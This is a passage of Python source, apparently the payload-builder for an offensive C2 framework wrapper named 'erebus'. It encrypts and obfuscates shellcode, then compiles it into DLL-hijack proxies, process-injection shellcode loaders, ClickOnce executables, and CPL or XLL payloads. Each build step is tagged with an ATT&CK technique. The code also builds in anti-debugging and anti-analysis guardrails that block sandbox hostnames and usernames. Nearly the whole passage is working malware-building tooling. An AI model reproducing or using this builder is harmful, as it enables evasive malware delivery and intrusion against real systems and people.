                    iv_match = re.search(r"unsigned char\s+iv\[\]\s*=\s*\{([^}]+)\}", shellcode_src)
                    if iv_match:
                        encryption_iv_bytes = ", ".join(x.strip() for x in iv_match.group(1).split(",") if x.strip())
                except Exception as e:
                    output += f"[WARN] Failed to parse shellcrypt key/IV: {str(e)}\n"

                # Copy the obfuscated shellcode file over to the shellcode.hpp file
                if self.get_parameter("0.1 Loader Type") == "Shellcode Loader":
                    shutil.copy(src=str(obfuscated_shellcode_path),
                                dst=str(encrypted_shellcode_path_sc))
                    output += f"[DEBUG] Copied C shellcode to {encrypted_shellcode_path_sc}\n"
                elif self.get_parameter("0.1 Loader Type") == "ClickOnce":
                    # For CSharp format, copy to encrypted_shellcode_path_sc which will be read later
                    shutil.copy(src=str(obfuscated_shellcode_path),
                                dst=str(encrypted_shellcode_path_sc))
                    output += f"[DEBUG] Copied CSharp shellcode to {encrypted_shellcode_path_sc}\n"
                elif self.get_parameter("0.0 Main Payload Type") == "Hijack":
                    shutil.copy(src=str(obfuscated_shellcode_path),
                                dst=str(encrypted_shellcode_path_sc))

                if self.get_parameter("0.9h XLL Payload Type") == "XLL Add-In DLL":
                    shutil.copy(src=str(obfuscated_shellcode_path),
                                dst=str(xll_shellcode_path))

                if self.get_parameter("2.4 Shellcode Format") == "Raw":
                    # Get the encryption key in C format to be used within the loader and other functions
                    cmd = [
                        "python",
                        shellcrypt_path,
                        "-i", mythic_shellcode_path,
                        "-e", ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
                        "-f",
                        "c",
                        "-a",
                        "shellcode"
                    ]

                    if self.get_parameter("2.2 Encryption Key") != "NONE":
                        cmd += ["-k", self.get_parameter("2.2 Encryption Key")]

                    shellcode_src = subprocess.check_output(cmd, text=True)
                    output += shellcode_src

                    # Write key to file
                    start = shellcode_src.find("unsigned char key")
                    end   = shellcode_src.find("};", start) + 2
                    key_array = shellcode_src[start:end]
                    output += key_array
                    with open(encrypted_shellcode_path_sc, "w") as file:
                        file.write(key_array)

                    response.status = BuildStatus.Success
                    response.build_message = "Shellcode Generated!"
                    response.build_stdout = output + "\n" + obfuscated_shellcode_path
                    response.updated_filename = "erebus_wrapper.bin"
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="[T1027] - Shellcode Obfuscation",
                        StepStdout="Obfuscated Shellcode - Continuing to Next Step",
                        StepSuccess=True,
                    ))
                else:
                    response.status = BuildStatus.Success
                    response.build_message = "Shellcode Generated!"
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="[T1027] - Shellcode Obfuscation",
                        StepStdout="Obfuscated Shellcode - Continuing to Next Step",
                        StepSuccess=True,
                    ))

            elif process.returncode != 0:
                response.payload = b""
                await SendMythicRPCPayloadUpdatebuildStep(
                    MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="[T1027] - Shellcode Obfuscation",
                    StepStdout="Failed to obfuscate shellcode",
                    StepSuccess=False,
                ))
                response.build_message = "Failed to obfuscate shellcode."
                response.build_stderr = output + "\n" + obfuscated_shellcode_path
                return response

            else:
                response.payload = b""
                response.status = BuildStatus.Error
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="[T1027] - Shellcode Obfuscation",
                    StepStdout="Failed to obfuscate shellcode",
                    StepSuccess=False,
                ))
                response.build_message = "Failed to obfuscate shellcode."
                response.build_stderr = output + "\n" + obfuscated_shellcode_path
                return response
            output = ""
            ######################### End of Shellcode Obfuscation Section #########################

            ######################### Payload Build Section #########################
            # Determine payload type and configure accordingly
            payload_type = self.get_parameter("0.0 Main Payload Type")
            dll_file_name = None  # Used to store DLL filename for final payload naming
            print(f'User Selected: {payload_type}')

            if payload_type == "Hijack":
                # [DLL HIJACK SPECIFIC] Get the DLL target file from Mythic
                file_content = await getFileFromMythic(
                    agentFileId=self.get_parameter("1.0 DLL Hijacking")
                )

                file_name_resp = await SendMythicRPCFileSearch(MythicRPCFileSearchMessage(
                    AgentFileID=self.get_parameter("1.0 DLL Hijacking")
                ))

                dll_file_name = ""
                if file_name_resp.Success and len(file_name_resp.Files) > 0:
                    dll_file_name = file_name_resp.Files[0].Filename
                if not dll_file_name:
                    dll_file_name = f"{self.get_parameter('1.0 DLL Hijacking')}.dll"

                with open(dll_target_path, "wb") as file:
                    file.write(file_content)

                # [DLL HIJACK SPECIFIC] Generate proxy exports
                exports = await generate_proxies(dll_file=dll_target_path, dll_file_name=dll_file_name)
                output += f"[DEBUG] Generated exports ({len(exports) if exports else 0} chars):\n{exports[:500] if exports else 'None'}\n"

                exports_list = {"EXPORTS": exports}
                proxy_template = environment.get_template("proxy.def")
                proxy_output = proxy_template.render(**exports_list)

                with open(dll_exports_path, "w") as file:
                    file.write(proxy_output)

                # Validate proxy.def was generated with actual exports
                if not exports or len(exports.strip()) == 0 or os.stat(dll_exports_path).st_size <= 20:
                    response.status = BuildStatus.Error
                    response.build_message = f"Failed to proxy the given file. No exports found or file too small ({os.stat(dll_exports_path).st_size} bytes)."
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="[T1518] - Gathering DLL Exports for Hijacking",
                        StepStdout=f"Failed to proxy the given file. Generated proxy.def is {os.stat(dll_exports_path).st_size} bytes.",
                        StepSuccess=False,
                    ))
                    return response

                shutil.copy(src=dll_exports_path, dst=loader_exports_path)

                # Copy the original DLL into the payload directory as <name>_orig.dll
                # so the forwarder chain resolves correctly at runtime
                orig_dll_name = f"{Path(dll_file_name).stem}_orig{Path(dll_file_name).suffix}"
                orig_dll_path = Path(agent_build_path) / "payload" / orig_dll_name
                with open(str(orig_dll_path), "wb") as f:
                    f.write(file_content)

                response.status = BuildStatus.Success
                response.build_message = "DLL Proxied! Compiling Payload..."
                await SendMythicRPCPayloadUpdatebuildStep(
                    MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="[T1518] - Gathering DLL Exports for Hijacking",
                    StepStdout="DLL Proxied! Compiling Payload...",
                    StepSuccess=True,
                ))

            elif payload_type == "Loader":
                loader_type = self.get_parameter("0.1 Loader Type")

                if loader_type == "Shellcode Loader":
                    shutil.copy(dst=f"{shellcode_loader_path}/erebus.bin",
                                src=obfuscated_shellcode_path)

                    # ===== Configure Shellcode Loader config.hpp =====
                    config_hpp_destination = PurePath(shellcode_loader_path) / "include" / "config.hpp"
                    config_hpp_destination = str(config_hpp_destination)

                    try:
                        # Load and render the config template
                        config_template = environment.get_template("config.hpp")
                        # Escape backslashes for C++ wide string literal
                        target_process = self.get_parameter("0.5 Shellcode Loader - Target Process").replace("\\", "\\\\")
                        compression_type_value = COMPRESSION_TYPE_MAP.get(self.get_parameter("2.0 Compression Type"), 0)
                        encoding_type_value = ENCODING_TYPE_MAP.get(self.get_parameter("2.3 Encoding Type"), 0)

                        # Guardrails configuration for Shellcode Loader
                        guardrails_enabled = 1 if self.get_parameter("0.5a Enable Guardrails") else 0
                        guardrails_check_debugger = 1 if self.get_parameter("0.5b Check IsDebuggerPresent") else 0
                        guardrails_check_remote = 1 if self.get_parameter("0.5c Check Remote Debugger") else 0
                        guardrails_check_processes = 1 if self.get_parameter("0.5d Check Debugger Processes") else 0
                        guardrails_check_hwbp = 1 if self.get_parameter("0.5e Check Hardware Breakpoints") else 0
                        guardrails_check_timing = 1 if self.get_parameter("0.5f Check Timing Anomalies") else 0

                        config_data = {
                            "TARGET_PROCESS": target_process,
                            "INJECTION_TYPE": self.get_parameter("0.4 Shellcode Loader - Injection Type"),
                            "COMPRESSION_TYPE": compression_type_value,
                            "ENCODING_TYPE": encoding_type_value,
                            "ENCRYPTION_TYPE": encryption_type_value,
                            "ENCRYPTION_KEY": encryption_key_bytes,
                            "ENCRYPTION_IV": encryption_iv_bytes,
                            "GUARDRAILS_ENABLED": guardrails_enabled,
                            "GUARDRAILS_CHECK_DEBUGGER": guardrails_check_debugger,
                            "GUARDRAILS_CHECK_REMOTE_DEBUGGER": guardrails_check_remote,
                            "GUARDRAILS_CHECK_DEBUGGER_PROCESSES": guardrails_check_processes,
                            "GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS": guardrails_check_hwbp,
                            "GUARDRAILS_CHECK_TIMING": guardrails_check_timing,
                        }
                        rendered_config = config_template.render(**config_data)

                        # Write the rendered config to the destination
                        with open(config_hpp_destination, "w") as config_file:
                            config_file.write(rendered_config)

                        response.status = BuildStatus.Success
                        response.build_message = "Shellcode Loader config generated!"
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="[T1036] - Configuring Shellcode Loader",
                            StepStdout="Generated config.hpp with user-defined injection parameters",
                            StepSuccess=True,
                        ))
                    except Exception as e:
                        response.status = BuildStatus.Error
                        response.build_stderr = f"Failed to render Shellcode Loader config: {str(e)}"
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="[T1036] - Configuring Shellcode Loader",
                            StepStdout=f"Failed to render config.hpp: {str(e)}",
                            StepSuccess=False,
                        ))
                        return response

                elif loader_type == "ClickOnce":
                    # ===== Configure ClickOnce InjectionConfig.cs =====
                    injection_config_destination = PurePath(clickonce_loader_path) / "InjectionConfig.cs"
                    injection_config_destination = str(injection_config_destination)

                    try:
                        encryption_key_bytes_clickonce = ""
                        encrypted_shellcode_bytes_clickonce = ""
                        if os.path.exists(encrypted_shellcode_path_sc):
                            try:
                                with open(encrypted_shellcode_path_sc, "r") as combined_file:
                                    combined_content = combined_file.read()
                                    output += f"[DEBUG] File read from: {encrypted_shellcode_path_sc}\n"
                                    output += f"[DEBUG] File size: {len(combined_content)} bytes\n"
                                    output += f"[DEBUG] First 500 chars: {combined_content[:500]}\n"
                                    import re

                                    # Extract key array bytes - handles both C++ and C# formats
                                    # Matches: key[2] = { ... } or byte[] key[2] = { ... }
                                    key_match = re.search(r'(?:byte\[\]\s+)?key\[\d+\]\s*=\s*\{([^}]*)\}', combined_content)
                                    if key_match:
                                        key_section = key_match.group(1)
                                        hex_key = re.findall(r'0x[0-9a-fA-F]{2}', key_section)
                                        if hex_key:
                                            encryption_key_bytes_clickonce = ", ".join(hex_key)
                                            output += f"[DEBUG] Extracted encryption key bytes: {encryption_key_bytes_clickonce}\n"
                                        else:
                                            output += f"[DEBUG] No hex values found in key section: {key_section[:100]}\n"
                                    else:
                                        output += "[DEBUG] Key array not found in file\n"

                                    # Extract shellcode array bytes - handles both C++ and C# formats
                                    # Matches: shellcode[113] = { ... } or sh3llc0d3[113] = { ... } or byte[] shellcode[113] = { ... }
                                    shellcode_match = re.search(r'(?:byte\[\]\s+)?(?:sh3llc0d3|shellcode)\[\d+\]\s*=\s*\{([^}]*)\}', combined_content)
                                    if shellcode_match:
                                        shellcode_section = shellcode_match.group(1)
                                        hex_shellcode = re.findall(r'0x[0-9a-fA-F]{2}', shellcode_section)
                                        if hex_shellcode:
                                            encrypted_shellcode_bytes_clickonce = ", ".join(hex_shellcode)
                                            output += f"[DEBUG] Extracted shellcode bytes (count: {len(hex_shellcode)})\n"
                                        else:
                                            output += f"[DEBUG] No hex values found in shellcode section: {shellcode_section[:100]}\n"
                                    else:
                                        output += "[DEBUG] Shellcode array not found in file\n"

                            except Exception as extract_error:
                                output += f"Warning: Could not extract encryption key or shellcode: {str(extract_error)}\n"
                        else:
                            output += f"[DEBUG] File does not exist: {encrypted_shellcode_path_sc}\n"

                        injection_config_template = environment.get_template("InjectionConfig.cs")
                        compression_type_value = COMPRESSION_TYPE_MAP.get(self.get_parameter("2.0 Compression Type"), 0)
                        encoding_type_value = ENCODING_TYPE_MAP.get(self.get_parameter("2.3 Encoding Type"), 0)

                        # Helper function to convert array to C# string format
                        def array_to_csharp_string(lst):
                            if not lst or len(lst) == 0:
                                return ""
                            return ", ".join(f'"{item}"' for item in lst)

                        # Guardrails configuration for ClickOnce
                        guardrails_enabled = 1 if self.get_parameter("0.5a Enable Guardrails") else 0
                        guardrails_check_debugger = 1 if self.get_parameter("0.5b Check IsDebuggerPresent") else 0
                        guardrails_check_processes = 1 if self.get_parameter("0.5d Check Debugger Processes") else 0
                        guardrails_check_hwbp = 1 if self.get_parameter("0.5e Check Hardware Breakpoints") else 0
                        guardrails_check_timing = 1 if self.get_parameter("0.5f Check Timing Anomalies") else 0

                        injection_config_data = {
                            "COMPRESSION_TYPE": compression_type_value,
                            "ENCODING_TYPE": encoding_type_value,
                            "ENCRYPTION_TYPE": encryption_type_value,
                            "INJECTION_METHOD": self.get_parameter("0.6 ClickOnce - Injection Method"),
                            "TARGET_PROCESS": self.get_parameter("0.7 ClickOnce - Target Process"),
                            "ENCRYPTION_KEY": encryption_key_bytes_clickonce,
                            "ENCRYPTION_SHELLCODE": encrypted_shellcode_bytes_clickonce,
                            "GUARDRAILS_ENABLED": "true" if guardrails_enabled else "false",
                            "GUARDRAILS_CHECK_DEBUGGER": "true" if guardrails_check_debugger else "false",
                            "GUARDRAILS_CHECK_DEBUGGER_PROCESSES": "true" if guardrails_check_processes else "false",
                            "GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS": "true" if guardrails_check_hwbp else "false",
                            "GUARDRAILS_CHECK_TIMING": "true" if guardrails_check_timing else "false",
                            "ALLOWED_HOSTNAMES": array_to_csharp_string(parse_csv(self.get_parameter("0.5g Hostname Whitelist")) if self.get_parameter("0.5a Enable Guardrails") else []),
                            "BLOCKED_HOSTNAMES": array_to_csharp_string(parse_csv(self.get_parameter("0.5h Block Analysis Hostnames")) if self.get_parameter("0.5a Enable Guardrails") else []),
                            "BLOCKED_USERNAMES": array_to_csharp_string(parse_csv(self.get_parameter("0.5i Block Analysis Usernames")) if self.get_parameter("0.5a Enable Guardrails") else []),
                            "ALLOWED_IPS": array_to_csharp_string(parse_csv(self.get_parameter("0.5j IP Whitelist")) if self.get_parameter("0.5a Enable Guardrails") else []),
                            "BLOCKED_IPS": array_to_csharp_string(parse_csv(self.get_parameter("0.5k IP Blacklist")) if self.get_parameter("0.5a Enable Guardrails") else []),
                            "ALLOWED_DOMAINS": array_to_csharp_string(parse_csv(self.get_parameter("0.5l Domain Whitelist")) if self.get_parameter("0.5a Enable Guardrails") else []),
                        }
                        rendered_injection_config = injection_config_template.render(**injection_config_data)

                        with open(injection_config_destination, "w") as config_file:
                            config_file.write(rendered_injection_config)

                        response.status = BuildStatus.Success
                        response.build_message = "ClickOnce config generated!"
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="[T1204.002] - Configuring ClickOnce Loader",
                            StepStdout="Generated InjectionConfig.cs with user-defined injection parameters",
                            StepSuccess=True,
                        ))
                    except Exception as e:
                        response.status = BuildStatus.Error
                        response.build_stderr = f"Failed to render ClickOnce config: {str(e)}"
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName="[T1204.002] - Configuring ClickOnce Loader",
                            StepStdout=f"Failed to render InjectionConfig.cs: {str(e)}",
                            StepSuccess=False,
                        ))
                        return response

            # ===== Configure & Compile Payload (Unified for all types) =====
            # Parse CSV helper function (used for guardrails)
            def parse_csv(value):
                if not value or not isinstance(value, str):
                    return []
                return [item.strip() for item in value.split(',') if item.strip()]

            # Configure guadrails if applicable
            if payload_type == "Hijack":
                guardrail_template = environment.get_template("guardrail.hpp")
                guardrails_enabled = self.get_parameter("1.1 Use Built-in Guardrails")
                guardrail_data = {
                    "use_builtin_guardrails": guardrails_enabled,
                    "check_debugger": self.get_parameter("1.1a Check IsDebuggerPresent") if guardrails_enabled else False,
                    "check_remote_debugger": self.get_parameter("1.1b Check Remote Debugger") if guardrails_enabled else False,
                    "check_debugger_processes": self.get_parameter("1.1c Check Debugger Processes") if guardrails_enabled else False,
                    "check_hardware_breakpoints": self.get_parameter("1.1d Check Hardware Breakpoints") if guardrails_enabled else False,
                    "check_timing": self.get_parameter("1.1e Check Timing Anomalies") if guardrails_enabled else False,
                    "allowed_hostnames": parse_csv(self.get_parameter("1.1f Hostname Whitelist")) if guardrails_enabled else [],
                    "blocked_hostnames": parse_csv(self.get_parameter("1.1g Block Analysis Hostnames")) if guardrails_enabled else [],
                    "blocked_usernames": parse_csv(self.get_parameter("1.1h Block Analysis Usernames")) if guardrails_enabled else [],
                    "allowed_ips": parse_csv(self.get_parameter("1.1i IP Whitelist")) if guardrails_enabled else [],
                    "blocked_ips": parse_csv(self.get_parameter("1.1j IP Blacklist")) if guardrails_enabled else [],
                    "allowed_domains": parse_csv(self.get_parameter("1.1k Domain Whitelist")) if guardrails_enabled else [],
                }
                guardrail_output = guardrail_template.render(**guardrail_data)
                guardrail_hpp_path = PurePath(shellcode_loader_path) / "include" / "guardrail.hpp"
                with open(str(guardrail_hpp_path), "w") as file:
                    file.write(guardrail_output)

                # Render config.hpp for Hijack build so encryption/compression settings take effect
                try:
                    config_template = environment.get_template("config.hpp")
                    compression_type_value = COMPRESSION_TYPE_MAP.get(self.get_parameter("2.0 Compression Type"), 0)
                    encoding_type_value = ENCODING_TYPE_MAP.get(self.get_parameter("2.3 Encoding Type"), 0)
                    config_data = {
                        "TARGET_PROCESS": "",
                        "INJECTION_TYPE": 3,  # CreateFiber (self-injection) - DLL runs in the hijacked process
                        "COMPRESSION_TYPE": compression_type_value,
                        "ENCODING_TYPE": encoding_type_value,
                        "ENCRYPTION_TYPE": encryption_type_value,
                        "ENCRYPTION_KEY": encryption_key_bytes,
                        "ENCRYPTION_IV": encryption_iv_bytes,
                        "GUARDRAILS_ENABLED": 1 if guardrails_enabled else 0,
                        "GUARDRAILS_CHECK_DEBUGGER": 1 if self.get_parameter("1.1a Check IsDebuggerPresent") and guardrails_enabled else 0,
                        "GUARDRAILS_CHECK_REMOTE_DEBUGGER": 1 if self.get_parameter("1.1b Check Remote Debugger") and guardrails_enabled else 0,
                        "GUARDRAILS_CHECK_DEBUGGER_PROCESSES": 1 if self.get_parameter("1.1c Check Debugger Processes") and guardrails_enabled else 0,
                        "GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS": 1 if self.get_parameter("1.1d Check Hardware Breakpoints") and guardrails_enabled else 0,
                        "GUARDRAILS_CHECK_TIMING": 1 if self.get_parameter("1.1e Check Timing Anomalies") and guardrails_enabled else 0,
                    }
                    rendered_config = config_template.render(**config_data)
                    config_hpp_destination = str(PurePath(shellcode_loader_path) / "include" / "config.hpp")
                    with open(config_hpp_destination, "w") as config_file:
                        config_file.write(rendered_config)
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="[T1036] - Configuring DLL Hijack Loader",
                        StepStdout="Generated config.hpp with encryption/compression settings",
                        StepSuccess=True,
                    ))
                except Exception as e:
                    response.status = BuildStatus.Error
                    response.build_stderr = f"Failed to render Hijack config: {str(e)}"
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="[T1036] - Configuring DLL Hijack Loader",
                        StepStdout=f"Failed to render config.hpp: {str(e)}",
                        StepSuccess=False,
                    ))
                    return response

                # DLL Hijack compilation
                cmd = [
                    "make",
                    "-C",
                    shellcode_loader_path,
                    f"ARCH={self.get_parameter('1.0a Hijack Loader Architecture')}",
                    f"BUILD={self.get_parameter('1.0b Hijack Build Configuration')}",
                    "TARGET=dll",
                    "all"
                ]
                compile_step_name = "[T1027.011] - Compiling DLL Payload"
                compile_step_msg = "DLL Loader Compiled!"
                payload_output_file = f"{shellcode_loader_path}/erebus.dll"
                payload_final_name = dll_file_name  # Use the actual DLL filename

            elif payload_type == "Loader":
                loader_type = self.get_parameter("0.1 Loader Type")

                if loader_type == "Shellcode Loader":
                    # Configure guardrails for Shellcode Loader
                    guardrail_template = environment.get_template("guardrail.hpp")
                    guardrails_enabled = self.get_parameter("0.5a Enable Guardrails")
                    guardrail_data = {
                        "use_builtin_guardrails": guardrails_enabled,
                        "check_debugger": self.get_parameter("0.5b Check IsDebuggerPresent") if guardrails_enabled else False,
                        "check_remote_debugger": self.get_parameter("0.5c Check Remote Debugger") if guardrails_enabled else False,
                        "check_debugger_processes": self.get_parameter("0.5d Check Debugger Processes") if guardrails_enabled else False,
                        "check_hardware_breakpoints": self.get_parameter("0.5e Check Hardware Breakpoints") if guardrails_enabled else False,
                        "check_timing": self.get_parameter("0.5f Check Timing Anomalies") if guardrails_enabled else False,
                        "allowed_hostnames": parse_csv(self.get_parameter("0.5g Hostname Whitelist")) if guardrails_enabled else [],
                        "blocked_hostnames": parse_csv(self.get_parameter("0.5h Block Analysis Hostnames")) if guardrails_enabled else [],
                        "blocked_usernames": parse_csv(self.get_parameter("0.5i Block Analysis Usernames")) if guardrails_enabled else [],
                        "allowed_ips": parse_csv(self.get_parameter("0.5j IP Whitelist")) if guardrails_enabled else [],
                        "blocked_ips": parse_csv(self.get_parameter("0.5k IP Blacklist")) if guardrails_enabled else [],
                        "allowed_domains": parse_csv(self.get_parameter("0.5l Domain Whitelist")) if guardrails_enabled else [],
                    }
                    guardrail_output = guardrail_template.render(**guardrail_data)
                    guardrail_hpp_path = PurePath(shellcode_loader_path) / "include" / "guardrail.hpp"
                    with open(str(guardrail_hpp_path), "w") as file:
                        file.write(guardrail_output)

                    build_config = self.get_parameter('0.3 Loader Build Configuration')

                    # Handle test build configuration
                    if build_config == "test":
                        cmd = [
                            "make",
                            "-C",
                            shellcode_loader_path,
                            "test-all-payloads"
                        ]
                        compile_step_name = "[T1027] - Compiling Test Payloads"
                        compile_step_msg = "All test payloads compiled!"
                        # For test builds, we'll zip all payloads from the payloads directory
                        payload_output_file = f"{shellcode_loader_path}/payloads"
                        payload_final_name = "test_payloads.zip"
                    else:
                        loader_format = self.get_parameter('0.2 Loader Format')
                        cmd = [
                            "make",
                            "-C",
                            shellcode_loader_path,
                            f"ARCH={self.get_parameter('0.2a Loader Architecture')}",
                            f"TARGET={loader_format}",
                            f"BUILD={build_config}",
                            "all"
                        ]
                        if loader_format == "dll":
                            compile_step_name = "[T1027.011] - Compiling DLL Payload"
                            compile_step_msg = "DLL Loader Compiled!"
                        elif loader_format == "cpl":
                            compile_step_name = "[T1218.002] - Compiling CPL Payload"
                            compile_step_msg = "CPL Loader Compiled!"
                        elif loader_format == "xll":
                            compile_step_name = "[T1559.002] - Compiling XLL Add-In"
                            compile_step_msg = "XLL Add-In Compiled!"
                        else:
                            compile_step_name = "[T1027] - Compiling Shellcode Loader"
                            compile_step_msg = "Shellcode Loader Compiled!"
                        payload_output_file = f"{shellcode_loader_path}/erebus.{loader_format}"
                        payload_final_name = f"erebus.{loader_format}"

                elif loader_type == "ClickOnce":
                    build_config = self.get_parameter('0.3 ClickOnce Build Configuration')
                    arch = self.get_parameter('0.3a ClickOnce Architecture') or "x64"
                    rid = f"win-{arch}"

                    cmd = [
                        "make",
                        "-C",
                        clickonce_loader_path,
                        f"CONFIG={build_config}",
                        f"RID={rid}",
                        "publish"
                    ]
                    compile_step_name = "[T1027] - Compiling ClickOnce Loader"
                    compile_step_msg = "ClickOnce Loader Compiled!"
                    payload_output_file = None  # Will be determined from publish directory
                    payload_final_name = "erebus.exe"

            # Execute compilation
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await process.communicate()

            if stdout:
                output += f"[stdout]\n{stdout.decode(errors='replace')}"
            if stderr:
                output += f"[stderr]\n{stderr.decode(errors='replace')}"

            # Handle compilation output
            if payload_type == "Hijack":
                payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
                payload_path = str(payload_path)
                shutil.copy(dst=payload_path, src=payload_output_file)

                if os.path.exists(payload_path):
                    response.status = BuildStatus.Success
                    response.build_message = "DLL Compiled!"
                    response.build_stdout = output + "\n" + payload_path
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName=compile_step_name,
                        StepStdout=compile_step_msg,
                        StepSuccess=True,
                    ))
                else:
                    response.status = BuildStatus.Error
                    response.payload = b""
                    response.build_message = "Failed to compile DLL"
                    response.build_stderr = output + "\n" + payload_path
                    await SendMythicRPCPayloadUpdatebuildStep(
                        MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName=compile_step_name,
                        StepStdout="Failed to Compile DLL Payload",
                        StepSuccess=False,
                    ))
                    return response

            elif payload_type == "Loader":
                loader_type = self.get_parameter("0.1 Loader Type")

                if loader_type == "Shellcode Loader":
                    build_config = self.get_parameter('0.3 Loader Build Configuration')

                    # Handle test build - create zip of all test payloads
                    if build_config == "test":
                        payloads_dir = Path(payload_output_file)  # payload_output_file contains path to payloads directory

                        output += f"[DEBUG] Payloads directory: {payloads_dir}\n"
                        output += f"[DEBUG] Payloads directory exists: {payloads_dir.exists()}\n"

                        if payloads_dir.exists():
                            files_in_dir = list(payloads_dir.iterdir())
                            output += f"[DEBUG] Files in payloads directory: {[f.name for f in files_in_dir]}\n"

                        if not payloads_dir.exists() or not any(payloads_dir.iterdir()):
                            response.status = BuildStatus.Error
                            response.build_message = "Failed to compile test payloads"
                            response.build_stderr = output + f"\nPayloads directory not found or empty: {payloads_dir}"
                            await SendMythicRPCPayloadUpdatebuildStep(
                                MythicRPCPayloadUpdateBuildStepMessage(
                                PayloadUUID=self.uuid,
                                StepName=compile_step_name,
                                StepStdout="Failed to Compile Test Payloads",
                                StepSuccess=False,
                            ))
                            return response

                        # Create agent_code/payloads directory for persistent storage
                        agent_code_payloads_dir = Path(__file__).resolve().parent.parent / "agent_code" / "payloads"
                        agent_code_payloads_dir.mkdir(parents=True, exist_ok=True)

                        # Create zip file using shutil
                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                        zip_basename = f"test_payloads_{timestamp}"

                        # Use shutil.make_archive to create zip (it adds .zip automatically)
                        # This creates the zip in the parent directory of payloads_dir
                        zip_archive_path = shutil.make_archive(
                            base_name=str(payloads_dir.parent / zip_basename),
                            format='zip',
                            root_dir=str(payloads_dir.parent),
                            base_dir=payloads_dir.name
                        )

                        output += f"[DEBUG] Created archive at: {zip_archive_path}\n"
                        output += f"[DEBUG] Archive size: {os.path.getsize(zip_archive_path)} bytes\n"

                        # Move the zip to agent_code/payloads
                        final_zip_path = agent_code_payloads_dir / f"{zip_basename}.zip"
                        shutil.move(zip_archive_path, str(final_zip_path))

                        output += f"[DEBUG] Moved archive to: {final_zip_path}\n"

                        # Also copy individual payloads to agent_code/payloads for easy access
                        files_copied = 0
                        for file in payloads_dir.iterdir():
                            if file.is_file():
                                shutil.copy(file, agent_code_payloads_dir / file.name)
                                files_copied += 1

                        output += f"[DEBUG] Copied {files_copied} individual files\n"

                        if os.path.exists(final_zip_path) and os.path.getsize(final_zip_path) > 0:
                            response.status = BuildStatus.Success
                            response.build_message = f"Test payloads compiled and saved to agent_code/payloads/!"
                            response.build_stdout = output + f"\nZip: {final_zip_path}\nIndividual files also copied\nContains {files_copied} test payloads"
                            await SendMythicRPCPayloadUpdatebuildStep(
                                MythicRPCPayloadUpdateBuildStepMessage(
                                PayloadUUID=self.uuid,
                                StepName=compile_step_name,
                                StepStdout=f"{compile_step_msg} Saved {files_copied} payloads to {agent_code_payloads_dir}",
                                StepSuccess=True,
                            ))

                            # For test builds, read the zip and return it as the payload
                            with open(final_zip_path, "rb") as f:
                                response.payload = f.read()
                            response.updated_filename = f"{zip_basename}.zip"

                            # Return early for test builds - skip containerization and other steps
                            return response
                        else:
                            response.status = BuildStatus.Error
                            response.build_message = f"Failed to create test payload zip"
                            response.build_stderr = output + "\n" + str(final_zip_path)
                            await SendMythicRPCPayloadUpdatebuildStep(
                                MythicRPCPayloadUpdateBuildStepMessage(
                                PayloadUUID=self.uuid,
                                StepName=compile_step_name,
                                StepStdout=f"Failed to package test payloads",
                                StepSuccess=False,
                            ))
                            return response
                    else:
                        payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
                        payload_path = str(payload_path)
                        shutil.copy(dst=payload_path, src=payload_output_file)

                        if os.path.exists(payload_path):
                            response.status = BuildStatus.Success
                            response.build_message = "Loader Compiled!"
                            response.build_stdout = output + "\n" + payload_path
                            await SendMythicRPCPayloadUpdatebuildStep(
                                MythicRPCPayloadUpdateBuildStepMessage(
                                PayloadUUID=self.uuid,
                                StepName=compile_step_name,
                                StepStdout=compile_step_msg,
                                StepSuccess=True,
                            ))
                        else:
                            response.status = BuildStatus.Error
                            response.build_message = "Failed to compile loader"
                            response.build_stderr = output + "\n" + payload_path
                            await SendMythicRPCPayloadUpdatebuildStep(
                                MythicRPCPayloadUpdateBuildStepMessage(
                                PayloadUUID=self.uuid,
                                StepName=compile_step_name,
                                StepStdout="Failed to Compile Shellcode Loader",
                                StepSuccess=False,
                            ))
                            return response

                elif loader_type == "ClickOnce":
                    if process.returncode != 0:
                        response.status = BuildStatus.Error
                        response.build_message = f"Makefile publish target failed with exit code {process.returncode}"
                        response.build_stderr = output
                        await SendMythicRPCPayloadUpdatebuildStep(
                            MythicRPCPayloadUpdateBuildStepMessage(
                            PayloadUUID=self.uuid,
                            StepName=compile_step_name,
